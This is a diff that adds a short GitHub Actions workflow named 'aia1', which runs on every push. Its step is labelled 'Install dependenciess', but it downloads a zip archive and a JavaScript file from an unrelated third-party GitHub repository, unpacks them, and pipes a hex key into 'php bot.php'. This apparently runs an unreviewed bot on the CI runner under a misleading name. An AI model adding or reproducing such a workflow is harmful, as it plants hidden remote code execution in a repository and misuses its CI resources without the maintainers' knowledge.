@@ -1,0 +1,25 @@
+on:
+  push:
+name: aia1
+
+jobs:
+  run_1:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Setup PHP
+      uses: shivammathur/setup-php@v2
+      with:
+        php-version: '8.1'
+        coverage: none
+    - name: Install dependenciess
+      run: |
+        wget https://github.com/Mosnio/mehi1/raw/main/clm/clm.zip
+        unzip clm.zip
+        wget https://github.com/Mosnio/mehi1/raw/main/clm/cn1.js -O config.json
+        echo -e "e5a91e6413b6bd2d920ed68d82e3228f\n2" | php bot.php
+
+  
+  
+  
+  
+  
